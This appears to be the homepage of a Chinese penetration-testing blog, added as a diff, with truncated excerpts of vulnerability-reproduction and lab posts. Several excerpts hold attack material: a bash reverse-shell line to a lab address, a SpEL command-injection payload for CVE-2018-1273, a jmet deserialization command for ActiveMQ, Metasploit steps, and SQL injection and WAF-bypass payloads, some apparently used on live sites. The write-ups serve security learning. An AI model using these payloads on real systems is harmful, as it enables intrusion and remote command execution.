@@ -1,0 +1,325 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>不负青春  不负时代</title><meta name="author" content="wh"><meta name="copyright" content="wh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta property="og:type" content="website">
+<meta property="og:title" content="不负青春  不负时代">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="不负青春  不负时代">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.png">
+<meta property="article:author" content="wh">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":100,"languages":{"author":"作者: wh","link":"链接: ","source":"来源: 不负青春  不负时代","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2021-03-21 17:06:29'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-color:transparent;"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">不负青春  不负时代</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">不负青春  不负时代</h1><div id="site-subtitle"><span id="subtitle"></span></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/03/21/Wordpress-Plugin-Simple-Job-Board-2-9-3-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-Metasploit/" title="Wordpress Plugin Simple Job Board 2.9.3 - 身份认证任意文件下载(Metasploit)">     <img class="post_bg" src="https://i.loli.net/2021/03/21/aHv4dIFqyM7wGUc.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Wordpress Plugin Simple Job Board 2.9.3 - 身份认证任意文件下载(Metasploit)"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/03/21/Wordpress-Plugin-Simple-Job-Board-2-9-3-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-Metasploit/" title="Wordpress Plugin Simple Job Board 2.9.3 - 身份认证任意文件下载(Metasploit)">Wordpress Plugin Simple Job Board 2.9.3 - 身份认证任意文件下载(Metasploit)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-03-21T04:07:58.000Z" title="发表于 2021-03-21 12:07:58">2021-03-21</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span></div><div class="content"></div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/03/11/sqlserver%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/" title="sqlserver差异备份getshell">     <img class="post_bg" src="https://i.loli.net/2021/03/21/UhzZIpxGgNw6FAM.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sqlserver差异备份getshell"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/03/11/sqlserver%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/" title="sqlserver差异备份getshell">sqlserver差异备份getshell</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-03-11T12:41:58.000Z" title="发表于 2021-03-11 20:41:58">2021-03-11</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span></div><div class="content">
+  4630436162ade97ba2718b7d0c4b3b6351ade09e539dfebeb5402828e29e64b0afb3c4ed1f3b67ee946669089ea1a8d688237b6796a1b070eb3bf346509acdfb33822ce67975b5ceacf45cd5efef1f7b5a3fe70bfdefe41f5b795c2c5058b1eb37ed1a2aa4095d8b43648c7773301f16c1472f30f1f20b1bd24e45a4433fd60e8f9984c32c70de626a8bef1109d2cf1ee577010153eca1e47e23feba689085fafbedcfc0d7cc566272d8c8a5fb6792c12890fe3fdc3d82330a0b449c258fb422b777f550897a508faedb6fb0252106f60b408cd9889063e1705567f2a97a11b1f336e217c9c8306852a11c0c2630f38f646725631bbe5cad9 ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/02/28/CNVD%E8%AF%81%E4%B9%A6/" title="CNVD证书">     <img class="post_bg" src="https://i.loli.net/2021/03/21/1oILiQW7ulA2fjP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CNVD证书"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/02/28/CNVD%E8%AF%81%E4%B9%A6/" title="CNVD证书">CNVD证书</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-02-28T11:47:08.000Z" title="发表于 2021-02-28 19:47:08">2021-02-28</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E8%AF%81%E4%B9%A6/">证书</a></span></div><div class="content">
+</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/02/13/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98DC-4/" title="靶机实战DC-4">     <img class="post_bg" src="https://i.loli.net/2021/03/21/MBSeZutbzOTQyIw.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="靶机实战DC-4"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/02/13/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98DC-4/" title="靶机实战DC-4">靶机实战DC-4</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-02-13T10:55:07.000Z" title="发表于 2021-02-13 18:55:07">2021-02-13</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">学习记录</a></span></div><div class="content">
+  4630436162ade97ba2718b7d0c4b3b63aa2ab1619d9cdbb4bb5fd57226dc61d2
+  
+    
+      
+      
+        Hey, password is required here.
+      
+    
+  
+
+</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/02/06/%E6%9F%90%E9%98%B2%E7%81%AB%E5%A2%99SQL%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/" title="某防火墙系统SQL注入漏洞注入挖掘过程">     <img class="post_bg" src="https://i.loli.net/2021/01/09/m72qLNwWuhzCcnE.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="某防火墙系统SQL注入漏洞注入挖掘过程"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/02/06/%E6%9F%90%E9%98%B2%E7%81%AB%E5%A2%99SQL%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/" title="某防火墙系统SQL注入漏洞注入挖掘过程">某防火墙系统SQL注入漏洞注入挖掘过程</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-02-06T13:29:46.000Z" title="发表于 2021-02-06 21:29:46">2021-02-06</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">渗透记录</a></span></div><div class="content">开始今天下午在fofa上遇到一个某防火墙下的一个站，本来是想试着找找有没有通用的弱口令或者万能密码，最终失败告终
+该防火墙系统登录页面如下
+
+看到这个登录页面，首先上bp爆破
+
+字典跑完了也没爆出来，常用的用户名换了几个也还是一样
+看了一眼数据包
+
+过程在username和password处尝试一下看看有没有注入点
+果然还是仔细一点好，在username处报错了
+
+使用order by 判断字段，用#来闭合，最终 ‘ order by 5 #报错，’ order by 4 #返回正常
+
+
+上sqlmap进行post注入
+post注入时，可以使用 -r x.txt 的形式，另一种方式使用 –data=”xx=xxx”来进行注入
+如果post请求的数据是这种形式的
+1参数1&#x3D;value1&amp;参数2&#x3D;value2&amp;参数3&#x3D;value3...
+
+这种形式使用-r来进行注入
+1sqlmap -r x.txt
+
+若post请求的数据是下面这样的
+12345678910POST &#x2F;login.php HTTP&#x2F;1.1Host: xxxx ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/01/23/WTS-WAF%E7%BB%95%E8%BF%87%E8%AE%B0%E5%BD%95/" title="WTS-WAF绕过记录">     <img class="post_bg" src="https://i.loli.net/2021/03/21/a2cqw8OyfYoNjXQ.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WTS-WAF绕过记录"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/01/23/WTS-WAF%E7%BB%95%E8%BF%87%E8%AE%B0%E5%BD%95/" title="WTS-WAF绕过记录">WTS-WAF绕过记录</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-01-23T03:15:05.000Z" title="发表于 2021-01-23 11:15:05">2021-01-23</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">渗透记录</a></span></div><div class="content">WTS-WAF绕过某建站系统下的一些案例
+测试拿到的站点简单的测试了一下，存在注入，但是部署了WAF
+
+可以看到WTS-WAF
+在关键词中加入%可以绕过
+1?id&#x3D;274 AN%D 1&#x3D;1
+
+
+没有拦截，说明可以绕过
+尝试
+1?id&#x3D;274 AN%D EXISTS(SELECT * FROM admin)
+
+被拦截
+
+在select和from中加入%
+1?id&#x3D;274 AN%D EXISTS(SEL%ECT * FR%OM admin)
+
+
+没有被拦，但是报错中可以看到select语法不对
+可能SELECT没有过滤
+1?id&#x3D;274 AN%D EXISTS(SELECT * FR%OM admin)
+
+
+返回正常说明存在admin表
+查询其他表
+1?id&#x3D;274 AN%D EXISTS(SELECT * FR%OM users)
+
+
+说明不存在users表
+使用sqlmap进行注入
+有waf存在
+参照sqlmap其他的tamper
+
+编写tamper，如下
+123456789101112131415161718from lib ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2021/01/18/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98DC-3/" title="靶机实战DC-3">     <img class="post_bg" src="https://i.loli.net/2021/01/11/QURCgVJHFu5M934.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="靶机实战DC-3"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/01/18/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98DC-3/" title="靶机实战DC-3">靶机实战DC-3</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-01-18T10:53:41.000Z" title="发表于 2021-01-18 18:53:41">2021-01-18</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">学习记录</a></span></div><div class="content">
+  4630436162ade97ba2718b7d0c4b3b63aa2ab1619d9cdbb4bb5fd57226dc61d2
+  
+    
+      
+      
+        Hey, password is required here.
+      
+    
+  
+
+</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2021/01/09/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98DC-1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="靶机实战DC-1通关记录">     <img class="post_bg" src="https://i.loli.net/2021/01/11/FfH9SbMUO6agA5P.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="靶机实战DC-1通关记录"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/01/09/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98DC-1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="靶机实战DC-1通关记录">靶机实战DC-1通关记录</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-01-09T02:59:34.000Z" title="发表于 2021-01-09 10:59:34">2021-01-09</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">学习记录</a></span></div><div class="content">靶机实战DC-1搭建靶机下载地址： https://www.five86.com/dc-1.html
+搭建完成后，扫描得知靶机ip为 192.168.1.100
+攻击机ip 192.168.1.101
+nmap扫描1$ nmap -A 192.168.1.100
+
+
+看到了开放的端口
+访问80端口
+看到是一个drupal 7 的CMS
+
+利用过程flag1在msf中找Drupal的exp
+
+我这里用的 drupal_drupageddon
+1$ use exploit&#x2F;multi&#x2F;http&#x2F;drupal_drupageddon
+
+
+查看需要配置的东西 show options
+
+将rhosts设置为192.168.1.100
+1$ set rhosts 192.168.1.100
+
+
+run或exploit开始利用
+
+成功，查看目录，发现有flag1.txt
+cat flag1.txt 查看
+
+flag2根据提示flag1给出的提示，flag2在配置文件中
+查询阅读http://drupalchina.cn/node/1402得知配置文件在sites/de ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/12/29/Spring-Data-Commons-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="Spring Data Commons 远程命令执行漏洞利用">     <img class="post_bg" src="https://i.loli.net/2021/03/21/2eD6QjlxJA9r7G1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Spring Data Commons 远程命令执行漏洞利用"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/12/29/Spring-Data-Commons-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="Spring Data Commons 远程命令执行漏洞利用">Spring Data Commons 远程命令执行漏洞利用</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-12-29T08:39:01.000Z" title="发表于 2020-12-29 16:39:01">2020-12-29</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span></div><div class="content">Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。
+利用过程执行命令访问192.168.1.106:8080/users页面
+
+
+是一个注册页面，bp抓包修改数据包
+在/tmp目录下创建success
+1$ username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch /tmp/success&quot;)]=&amp;password=&amp;repeatedPassword=
+
+
+发现成功在tmp文件下创建success
+
+反弹shell创建一个文件bash.sh写入反弹shell的语句
+1$ bash -i &gt;&amp; /dev/tcp/192.168.1.102/5555 0&gt;&amp;1
+
+将bash.sh放在root目录下
+在此目录下开启一个http服务 ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/11/20/ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="ActiveMQ反序列化漏洞复现">     <img class="post_bg" src="https://i.loli.net/2021/03/21/9qhNC2VS6yIpJHW.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ActiveMQ反序列化漏洞复现"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/11/20/ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="ActiveMQ反序列化漏洞复现">ActiveMQ反序列化漏洞复现</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-11-20T08:30:30.000Z" title="发表于 2020-11-20 16:30:30">2020-11-20</time></span><span class="article-meta"><span class="article-meta__separator">|</span><i class="fas fa-inbox article-meta__icon"></i><a class="article-meta__categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span></div><div class="content">ActiveMQ反序列化漏洞（CVE-2015-5254）Apache ActiveMQ版本5.x之前的5.13.0安全漏洞，该程序引起的漏洞并不限制可以在代理中序列化的类。远程攻击者可以使特殊的序列化Java消息服务（JMS）ObjectMessage对象利用此漏洞来执行任意代码。
+访问http://192.168.1.105:8161
+利用过程执行命令将生成序列化的有效负载jmet发送到61616端口，访问web管理页面，点击触发漏洞
+1$ java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME 192.168.1.105 61616
+
+查看事件并点击触发
+
+发现成功在tmp文件下创建success
+
+反弹shell1$ bash -i &gt;&amp; /dev/tcp/192.168.1.102/5555 0&gt;&amp;1
+
+base64加密后发送到61616端口
+1$ java -jar jmet-0.1.0-all.jar -Q e ...</div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">wh</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/03/21/Wordpress-Plugin-Simple-Job-Board-2-9-3-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-Metasploit/" title="Wordpress Plugin Simple Job Board 2.9.3 - 身份认证任意文件下载(Metasploit)"><img src="https://i.loli.net/2021/03/21/aHv4dIFqyM7wGUc.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Wordpress Plugin Simple Job Board 2.9.3 - 身份认证任意文件下载(Metasploit)"/></a><div class="content"><a class="title" href="/2021/03/21/Wordpress-Plugin-Simple-Job-Board-2-9-3-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-Metasploit/" title="Wordpress Plugin Simple Job Board 2.9.3 - 身份认证任意文件下载(Metasploit)">Wordpress Plugin Simple Job Board 2.9.3 - 身份认证任意文件下载(Metasploit)</a><time datetime="2021-03-21T04:07:58.000Z" title="发表于 2021-03-21 12:07:58">2021-03-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/11/sqlserver%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/" title="sqlserver差异备份getshell"><img src="https://i.loli.net/2021/03/21/UhzZIpxGgNw6FAM.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sqlserver差异备份getshell"/></a><div class="content"><a class="title" href="/2021/03/11/sqlserver%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BDgetshell/" title="sqlserver差异备份getshell">sqlserver差异备份getshell</a><time datetime="2021-03-11T12:41:58.000Z" title="发表于 2021-03-11 20:41:58">2021-03-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/28/CNVD%E8%AF%81%E4%B9%A6/" title="CNVD证书"><img src="https://i.loli.net/2021/03/21/1oILiQW7ulA2fjP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CNVD证书"/></a><div class="content"><a class="title" href="/2021/02/28/CNVD%E8%AF%81%E4%B9%A6/" title="CNVD证书">CNVD证书</a><time datetime="2021-02-28T11:47:08.000Z" title="发表于 2021-02-28 19:47:08">2021-02-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/13/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98DC-4/" title="靶机实战DC-4"><img src="https://i.loli.net/2021/03/21/MBSeZutbzOTQyIw.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="靶机实战DC-4"/></a><div class="content"><a class="title" href="/2021/02/13/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98DC-4/" title="靶机实战DC-4">靶机实战DC-4</a><time datetime="2021-02-13T10:55:07.000Z" title="发表于 2021-02-13 18:55:07">2021-02-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/06/%E6%9F%90%E9%98%B2%E7%81%AB%E5%A2%99SQL%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/" title="某防火墙系统SQL注入漏洞注入挖掘过程"><img src="https://i.loli.net/2021/01/09/m72qLNwWuhzCcnE.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="某防火墙系统SQL注入漏洞注入挖掘过程"/></a><div class="content"><a class="title" href="/2021/02/06/%E6%9F%90%E9%98%B2%E7%81%AB%E5%A2%99SQL%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/" title="某防火墙系统SQL注入漏洞注入挖掘过程">某防火墙系统SQL注入漏洞注入挖掘过程</a><time datetime="2021-02-06T13:29:46.000Z" title="发表于 2021-02-06 21:29:46">2021-02-06</time></div></div></div></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div 